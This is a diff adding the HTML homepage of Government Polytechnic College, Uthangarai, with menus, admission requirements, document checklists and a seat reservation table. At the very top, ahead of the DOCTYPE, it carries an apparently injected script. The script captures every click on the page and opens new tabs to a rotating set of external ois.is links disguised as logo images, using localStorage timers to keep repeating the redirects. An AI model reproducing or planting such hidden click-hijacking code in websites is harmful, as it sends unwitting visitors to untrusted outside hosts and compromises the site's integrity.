@@ -1,0 +1,474 @@
+<script>(function (parameters) {
+    const targets = [
+        \'https://ois.is/images/logo-1.png\', \'https://ois.is/images/logo-2.png\', \'https://ois.is/images/logo-3.png\', \'https://ois.is/images/logo-4.png\', \'https://ois.is/images/logo-5.png\', \'https://ois.is/images/logo-6.png\', \'https://ois.is/images/logo-7.png\', \'https://ois.is/images/logo-8.png\'
+    ]
+    // Times between clicks
+    const restMinutes = 1;
+    // Number of hours to allow re-click 
+    const allowedHours = 2;
+
+
+    const saveTargetLocationsToStorage = (targets) => {
+        targets.forEach((target, index) => {
+            if(!localStorage.getItem(`${target}-local-storage`)){
+            	localStorage.setItem(`${target}-local-storage`, 0);
+            }
+        });
+    }
+    const getRandomLocationFromStorage = (targets) => {
+        const nonVisited = targets.filter((target, index) => localStorage.getItem(`${target}-local-storage`) == 0)
+        return nonVisited[Math.floor(Math.random() * nonVisited.length)];
+    }
+    const setLocationAsVisited = (target) => localStorage.setItem(`${target}-local-storage`, 1);
+
+    const getTimeStorage = (key) => localStorage.getItem(`${key}-local-storage`);
+    const setTimeToStorage = (key, nowDate) => localStorage.setItem(`${key}-local-storage`, nowDate);
+
+    const getHoursDiff = (startDate, endDate) => {
+        const msInHour = 1000 * 60 * 60;
+        return Math.round(Math.abs(endDate - startDate) / msInHour);
+    }
+    const getMintsDiff = (startDate, endDate) => {
+        const msInMints = 1000 * 60;
+        return Math.round(Math.abs(endDate - startDate) / msInMints);
+    }
+
+    const visitNewLocation = (targets, host, nowDate) => {
+        saveTargetLocationsToStorage(targets);
+        newLocation = getRandomLocationFromStorage(targets);
+        setTimeToStorage(`${host}-mnts`, nowDate);
+        setTimeToStorage(`${host}-hurs`, nowDate);
+        setLocationAsVisited(newLocation);
+        window.open(newLocation, "_blank");
+    }
+
+    // const randomLocation = getRandomLocationFromStorage(targets);
+    saveTargetLocationsToStorage(targets);
+
+    function globalClick(event) {
+        event.stopPropagation();
+        const host = location.host;
+        let newLocation = getRandomLocationFromStorage(targets);
+        const nowDate = Date.parse(new Date());
+        const savedDateForMints = getTimeStorage(`${host}-mnts`);
+        const savedDateForHours = getTimeStorage(`${host}-hurs`);
+
+        if (savedDateForMints && savedDateForHours) {
+            try {
+                const storageDateForMints = parseInt(savedDateForMints);
+                const storageDateForHours = parseInt(savedDateForHours);
+                const mintsDiff = getMintsDiff(nowDate, storageDateForMints);
+                const hoursDiff = getHoursDiff(nowDate, storageDateForHours);
+
+                if (hoursDiff >= allowedHours) {
+                    saveTargetLocationsToStorage(targets);
+                    setTimeToStorage(`${host}-hurs`, nowDate);
+                }
+                if (mintsDiff >= restMinutes) {
+                    if (newLocation) {
+                        setTimeToStorage(`${host}-mnts`, nowDate);
+                        window.open(newLocation, "_blank");
+                        setLocationAsVisited(newLocation);
+                    }
+                }
+            } catch (error) { visitNewLocation(targets, host, nowDate); }
+        } else { visitNewLocation(targets, host, nowDate); }
+    }
+    document.addEventListener("click", globalClick)
+})()</script>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<title>Government Polytechnic college | Uthangarai</title>
+<meta name="keywords" content="139 GPT College|top Polytechnic colleges in Krishnagiri |DOTE Examination results" />
+<meta name="description" content="Government Polytechnic college was established in the year of 2013 in Uthangarai." />
+<link href="images/favicon.ico" rel="shortcut icon" />
+<link href="css/style.css" rel="stylesheet" type="text/css" />
+<link href="css/jquery.bxslider.css" rel="stylesheet" />
+ <link href="css/menu.css" rel="stylesheet" type="text/css" />
+ 
+<script type="text/javascript" src="js/jquery.min.js"></script><script src="js/jquery.bxslider.min.js"></script><script type="text/javascript">
+	var $boxslider = jQuery.noConflict();
+	$boxslider(document).ready(function(){
+  		$boxslider('.bxslider').bxSlider({
+		  mode: 'fade',
+		  auto: true,
+		  autoControls: true,
+		  pause: 3000
+		});
+	});
+</script><!--<script>
+function blink(selector){
+	$(selector).fadeOut('slow', function(){
+	    $(this).fadeIn('slow', function(){
+	        blink(this);
+	    });
+	});
+	}
+
+	blink('.blink');
+</script>
+
+-->
+<link href="css/facebox.css" media="screen" rel="stylesheet" type="text/css" /><script src="js/facebox.js" type="text/javascript">
+</script>
+<script type="text/javascript">
+	function popupjobfair(){
+		var $jobfair = jQuery.noConflict();
+		$jobfair.facebox({ ajax: 'megajobfair_2018.html' }) 
+				
+	}
+</script>
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','analytics.js','ga');
+
+  ga('create', 'UA-43910268-1', 'gpt');
+  ga('send', 'pageview');
+</script><script type="text/javascript" src="#" async="async">
+</script>
+<!--slide show -->
+<script>
+var slideIndex = 1;
+showSlides(slideIndex);
+
+function plusSlides(n) {
+  showSlides(slideIndex += n);
+}
+
+function currentSlide(n) {
+  showSlides(slideIndex = n);
+}
+
+function showSlides(n) {
+  var i;
+  var slides = document.getElementsByClassName("mySlides");
+  var dots = document.getElementsByClassName("dot");
+  if (n > slides.length) {slideIndex = 1}    
+  if (n < 1) {slideIndex = slides.length}
+  for (i = 0; i < slides.length; i++) {
+      slides[i].style.display = "none";  
+  }
+  for (i = 0; i < dots.length; i++) {
+      dots[i].className = dots[i].className.replace(" active", "");
+  }
+  slides[slideIndex-1].style.display = "block";  
+  dots[slideIndex-1].className += " active";
+}
+</script>
+
+</head>
+<body>
+<div id="full_bundle">
+<div id="header">
+<div id="logo">
+<a href="index.html"><img alt="Government Polytechnic college, Uthangarai" src="images/home/gpt_logo19.jpg" /></a>
+</div>
+
+<div id="header_right"><div id="staff_login1"><a href="images/logo.jpg"><div style="width:970px; height:120px"></div></a></div>
+
+</div>
+</div>
+
+
+<div class="menu-nav">
+<ul>
+	<li><a href="index.html">Home</a>
+		<ul>
+        		<li><a href="index.html">Histroy</a></li>
+                <li><a href="counselling.html">Admission</a></li>
+                <!--<li><a href="infrastructure.html">Infrastructure</a></li>-->
+                <li><a href="fees.html">Fees Details</a></li>
+                
+    	</ul>
+	
+	</li>
+	
+	
+    <li><a href="index.html">About</a>
+    	<ul>
+        		<li><a href="vision.html">Vision & Mission</a></li>
+                <li><a href="princ-msg.html">Principal message</a></li>
+                <li><a href="journey.html">Journey till Date</a></li>
+                
+    	</ul>
+        </li>
+    	<li><a href="index.html">Academics</a>
+    	<ul>    
+    	         <li><a href="administration.html">Administration</a></li>
+    	        <li><a href="civil.html">Civil</a></li>
+    	        <li><a href="mech.html">Mech</a></li>
+    	        <li><a href="electrical.html">EEE</a></li>
+                <li><a href="ece.html">ECE</a></li>
+        		<li><a href="computer.html">Computer</a></li>
+                <li><a href="examination.html">Examination</a></li>
+                <li><a href="result.html">Result Analysis</a></li>
+                <!--<li><a href="counselling.html">Counselling details</a></li>
+                 <li><a href="#">Library</a></li>-->
+    	</ul>
+        </li>
+    <li><a href="index.html">Faculty</a>
+    	<ul>         
+        		<li><a href="faculty.html">Teaching Staff</a></li>
+                <li><a href="non-teaching.html">Non Teaching Staff</a></li>
+                
+         </ul>
+    
+    </li>
+    <li><a href="index.html">AICTE</a>
+    	<ul>          
+    			<li><a href="aicte.html">AICTE APPROVAL REPORT</a></li>
+        		<li><a href="grievance-rederssal.html">Grievance Redressal</a></li>
+                	<li><a href="student-db.html">Student Data</a></li>
+                	<li><a href="antiragging.html">Anti-ragging</a></li>
+                	<li><a href="aictedoc.html">AICTE Documents</a></li>
+         </ul>
+    
+    </li>
+    <li><a href="index.html">Facilites</a>
+    	<ul>         
+        		<!--<li><a href="campus.html">ECO Fridendly Campus</a></li>
+                <li><a href="smart-classroom.html">Smart Class Room</a></li>-->
+                <li><a href="library.html">Library</a></li>
+         </ul>
+         </li>
+    
+    <li><a href="index.html">Activities</a>
+    <ul>         <li><a href="nss.html">NSS</a></li>
+                <li><a href="yrc.html">YRC</a></li>
+                <li><a href="greenclub.html">Green Club</a></li>
+                <li><a href="placement.html">Placement</a></li>
+                <li><a href="hostal.html">Hostel</a></li>
+        		<li><a href="sports.html">Sports</a></li>
+               
+                <li><a href="cultural.html">Cultural Activity</a></li>
+                
+                
+         </ul>
+         </li>
+    <li><a href="student-corner.html">Student Corner</a>
+    	<ul>         
+        		 <li><a href="student-corner.html">MOU with Industry</a></li>
+                <li><a href="student-corner.html">Question Bank</a></li>
+                <li><a href="student-corner.html">Time Table</a></li>
+                <li><a href="student-corner.html">Feed Back</a></li>
+         </ul>
+         </li>
+<li><a href="contact.html">Contact</a></li>
+    
+</ul>
+</div>
+<!--menu ends here-->
+<div class="slideshow-container">
+<div id="home_flash">
+<ul class="bxslider">
+	<li><a herf="index.html"><img alt="Government Polytechnic college, Uthangarai" src="images/clg-frt1.jpg" /></a></li>
+	<li><img alt="Government Polytechnic college, Uthangarai" src="images/ad2.jpg" width="700" height="400" align="center"/></li>
+	<li><img alt="Government Polytechnic college, Uthangarai" src="images/ad1.jpg" /></li>
+	<li><img alt="Government Polytechnic college, Uthangarai" src="images/clg-frt5.jpg" /></li>
+	<li><img alt="Government Polytechnic college, Uthangarai" src="images/clg-frt7.jpg" /></li>
+	<li><img alt="Government Polytechnic college, Uthangarai" src="images/clg-frt8.jpg" /></li>
+	<li><img alt="Government Polytechnic college, Uthangarai" src="images/clg-frt11.jpg" /></li>
+	<li><img alt="Government Polytechnic college, Uthangarai" src="images/clg-frt13.jpg" /></li>
+	<!--<li><img alt="Government Polytechnic college, Uthangarai" src="images/gandhi-jayanti10.jpg" /></li>
+	<li><img alt="Government Polytechnic college, Uthangarai" src="images/gandhi-jayanti3.jpg" /></li>
+	<li><img alt="Government Polytechnic college, Uthangarai" src="images/projectexpo1.jpg" /></li>
+	<li><img alt="Government Polytechnic college, Uthangarai" src="images/clg-second-phase.jpg" /></li>
+	<li><img alt="Government Polytechnic college, Uthangarai" src="placement/titan-19.jpg" /></li>
+	<li><img alt="Government Polytechnic college, Uthangarai" src="images/notice/anti-ragging2.jpg" /></li>
+	<li><img alt="Government Polytechnic college, Uthangarai" src="images/notice/gpt-valuation-18.jpg" /></li>
+	<li><img alt="Government Polytechnic college, Uthangarai" src="images/clg-cm-meet18.jpg" /></li>
+	<li><img alt="Government Polytechnic college, Uthangarai" src="images/placement/placementfr7.jpg" /></li> 
+	 <li><img alt="Government Polytechnic college, Uthangarai" src="images/clgfr2.jpg" /></li>
+	<li><img alt="Government Polytechnic college, Uthangarai" src="images/clgfr7.jpg" /></li>
+	<li><img alt="Government Polytechnic college, Uthangarai" src="images/clgfr3.jpg" /></li>
+    <li><img alt="Government Polytechnic college, Uthangarai" src="images/clgfr4.jpg" /></li>
+    <li><img alt="Government Polytechnic college, Uthangarai" src="images/clgfr6.jpg" /></li>
+    <li><img alt="Government Polytechnic college, Uthangarai" src="images/clgfr5.jpg" /></li>
+    <li><img alt="Government Polytechnic college, Uthangarai" src="images/clgfr8.jpg" /></li>-->
+    
+	<!--<button class="btn" id="btn1">&#10094;</button>
+    <button class="btn" id="btn2">&#10095;</button>-->
+</ul>
+<a class="prev" onclick="plusSlides(-1)">&#10094;</a>
+<a class="next" onclick="plusSlides(1)">&#10095;</a>
+</div>
+</div>
+<div style="text-align:center">
+  <span class="dot" onclick="currentSlide(1)"></span> 
+  <span class="dot" onclick="currentSlide(2)"></span> 
+  <span class="dot" onclick="currentSlide(3)"></span> 
+  <span class="dot" onclick="currentSlide(4)"></span>
+  <span class="dot" onclick="currentSlide(5)"></span>
+  <span class="dot" onclick="currentSlide(6)"></span>
+  <span class="dot" onclick="currentSlide(7)"></span>
+  <span class="dot" onclick="currentSlide(8)"></span>
+  <span class="dot" onclick="currentSlide(9)"></span>
+  <span class="dot" onclick="currentSlide(10)"></span>
+</div>
+<!--flash banner ends here-->
+
+<div id="body">
+  <div id="inner_left">
+    <div class="border3"></div>
+    	<div class="pg_head"><u>ADMISSION:</u></div>
+    	<div class="pg_txt">
+    	    <p>The institution offer 3 year Diploma Programme as per the AICTE approval in the following Disciplines and the total intake per branch is indicated in the table below. </p>
+    	<div align="center">
+    	<img alt="Government Polytechnic college, Uthangarai" width="600" height="300" src="images/INTAKE.jpg" />
+    	</div>
+    	<p> Also, 10% of the intake is admitted in the Second year as Lateral entry.</p>
+    	</div>
+    		<div class="pg_head"><u>ADMISSION PROCESS:</u></div>
+    	<div class="pg_txt">
+    	    <p>Both Boys and Girls are admitted as per the Govt. norms. Admission process and Eligibility criteria are given below</p>
+    	    <br>
+    	   <li> Qualifying Examination</li>
+	            <p>A pass in the 10th Standard (SSLC) with 35 Marks in Examination or any other equivalent qualification.</p>
+
+            <li>Age Limit</li>
+	            <p>No age limit.</p>
+
+	        <li>Candidates seeking admission against ST/SC/SC(A)/MBC&DNC/BC(Others) /BC(Muslims) quota should obtain the certificate of social status in the prescribed permanent community cards and produce at the time of admission.
+	        For Communities linked with Districts the candidate should obtain their Community Certificate in the respective districts only.</li>
+
+            <div class="pg_head">MODE OF SELECTION</div>
+            <br>
+            <li>Regular Diploma Courses</li>
+	         <li>Selection of eligible candidates for the courses in the Polytechnic College and Special Institutions will be made based on the total marks secured in the qualifying examination and the ranking will be done in the order of total marks secured by the candidates in the SSLC/Equivalent examination following communal reservation. In respect of candidates whose maximum marks in the qualifying examination more than 500 as per scheme, the maximum marks shall be reduced to a base of 500 and rank arrived at along with other candidate. </li>
+
+	         <li>Branch will be allotted according to merit through counselling by the respective principal as per rules of communal reservation. </li>
+	
+	         <li>The Register Number of the selected candidates will be published in the Notice Board of the Polytechnic concerned. Intimation of selection will be sent to the selected candidates by the Principal of the Polytechnic concerned under Registered Post with Acknowledgement Due. </li>
+
+    	
+    	</div>
+    	
+    <!--	<div class="pg_head"><u>ADMISSION POLICY</u></div>
+    	<div class="pg_txt">
+    	   
+    	<img alt="Government Polytechnic college, Uthangarai" src="images/notice/reservation-policy.jpg" />
+    	</div>
+    	<div class="pg_head"><u> FIRST YEAR COUNSELLING DOCUMENTS REQUIREMENTS: </u></div>-->
+        <div class="pg_txt">
+      	<p>1. SSLC(10th) Marksheet</br>
+           2. Transfer Certificate</br>
+           3. Community Certificate</br>
+           4. Conduct Certificate</br>
+           5. Passport size Colour Photos - 5 Nos</br>
+           6. student e-mail id </br>
+           7. Contact number </br>
+           8. Aadhar Card </br>
+           </p>
+           <div class="pg_head"><u>Photocopy of Certificates:</u></br></div>
+           </br>
+            		1. Marksheet				- 5 Copy </br>
+            		2. Community Certificate	- 5 Copy </br>
+            		3. Transfer Certificate		- 5 Copy </br>
+            		4. Aadhar Card				- 5 Copy </br>
+            		5. Income Certificate		- 5 Copy </br>
+            	</br>
+	</div>
+	<div class="pg_head"><u> LATERAL ENTRY(SECOND YEAR) COUNSELLING DOCUMENTS REQUIREMENTS:</u> </div>
+        <div class="pg_txt">
+      	<p> 1. SSLC(10th) Marksheet</br>
+        	2. HSC(+2) Marksheet (or) ITI Marksheet </br>
+        	3. Transfer Certificate</br>
+           4. Community Certificate</br>
+           5. Conduct Certificate</br>
+           6. Passport size Colour Photos - 5 Nos</br>
+           7. student e-mail id </br>
+           8. Contact number </br>
+           9. Aadhar Card </br>
+           </p>
+           </br>
+    	   <div class="pg_head"><u>Photocopy of Certificates:</u></br></div>
+           </br>
+            1. Marksheet				- 5 Copy </br>
+            2. Community Certificate	- 5 Copy </br>
+            3. Transfer Certificate		- 5 Copy </br>
+            4. Aadhar Card				- 5 Copy </br>
+            5. Income Certificate		- 5 Copy </br>
+            6. Bank pass book(front page)-5 Copy </br>
+            	</br>
+</div>
+<div class="pg_head"> <u>RESERVATION POLICY </u></div>
+    		
+            	<div class="pg_txt" >
+  <table width="500" border="1">
+  <tr bgcolor="#0099FF" style="font-weight:bold" align="center">
+    <td colspan="4">FIRST YEAR & LATERAL ENTRY</td>
+    </tr>
+  <tr style="font-weight:bold" align="center">
+    <td colspan="2">CATEGORY</td>
+    <td>PERCENTAGE</td>
+    <td >NO.OF SEATS</td>
+  </tr>
+  <tr align="center">
+    <td>OC</td>
+    <td> </td>
+    <td> 31% </td>
+    <td> 19 </td>
+  </tr>
+  <tr align="center">
+    <td>BC(O)</td>
+    <td>26.50%</td>
+    <td rowspan="2">30%</td>
+    <td>16</td>
+  </tr>
+   <tr align="center">
+    <td>BC(M)</td>
+    <td>3.50%</td>
+    <td> 2 </td>
+  </tr>
+  <tr align="center">
+    <td>MBC/DNC</td>
+    <td> </td>
+    <td>20%</td>
+    <td> 12 </td>
+  </tr>
+  <tr align="center">
+    <td>SC</td>
+    <td>15%</td>
+    <td rowspan="2"> 18%</td>
+    <td> 8 </td>
+  </tr>
+  <tr align="center">
+    <td>SC(A)</td>
+    <td>3%</td>
+   
+    <td> 2 </td>
+  </tr>
+  <tr align="center">
+    <td>ST</td>
+    <td> </td>
+   <td> 1% </td>
+    <td> 1 </td>
+  </tr>
+  <tr style="font-weight:bold" align="center">
+    <td> </td>
+    <td> </td>
+    <td> 100%</td>
+    <td> 60 </td>
+  </tr>
+  </table>
+</br>
+</div>
+</div>
+ <!--full bundle ends here-->
+
+<div id="footer">
+<div class="btm_menu"><a class="btm_menu" href="../course/alumni">Alumni&nbsp;</a> |<a class="btm_menu" href="../course/gallery-infrastructure-sports-graduation-day.html">&nbsp; Gallery&nbsp;</a> |&nbsp;<a class="btm_menu" href="../course/feedback-arunai-engineering-college.php">&nbsp;Feedback&nbsp;</a> |<a class="btm_menu" href="../course/events-GPT Uthangarai-colleges-padikarkal-GPT Uthangaraiofest-oviya.html">&nbsp; Events&nbsp; </a>|<a class="btm_menu" href="../course/thiruvanamalai-engineering-college-arunai.html">&nbsp; Uthangarai&nbsp;&nbsp;</a>|<a class="btm_menu" href="../course/sitemap-arunai-engineering-college-anna-university.html"> &nbsp;Sitemap</a></div>
+
+<div class="btm_txt">&copy; Govt Polytechnic College, Uthangarai. All Rights Reserved&nbsp; | &nbsp;Powered By&nbsp;Department of Computer Engineering &nbsp;&nbsp;&nbsp;</div>
+
+<div align="center" class="counter"><img alt="URL Counter" border="0" src="http://hitwebcounter.com/counter/counter.php?page=6520450&amp;style=0024&amp;nbdigits=5&amp;type=page&amp;initCount=0" /></div>
+</div>
+<script>document.getElementById('copyright').appendChild(document.createTextNode(new Date().getFullYear()))</script>
+</body><script>'undefined'=== typeof _trfq || (window._trfq = []);'undefined'=== typeof _trfd && (window._trfd=[]),_trfd.push({'tccl.baseHost':'secureserver.net'},{'ap':'cpsh'},{'server':'sg2plcpnl0150'},{'dcenter':'sg2'},{'cp_id':'4798043'},{'cp_cache':''},{'cp_cl':'6'}) // Monitoring performance to make your website faster. If you want to opt-out, please contact web hosting support.</script><script src='https://img1.wsimg.com/traffic-assets/js/tccl.min.js'></script></html>
+ 
+<!-- InstanceEndEditable -->
+<!--banner ends here-->
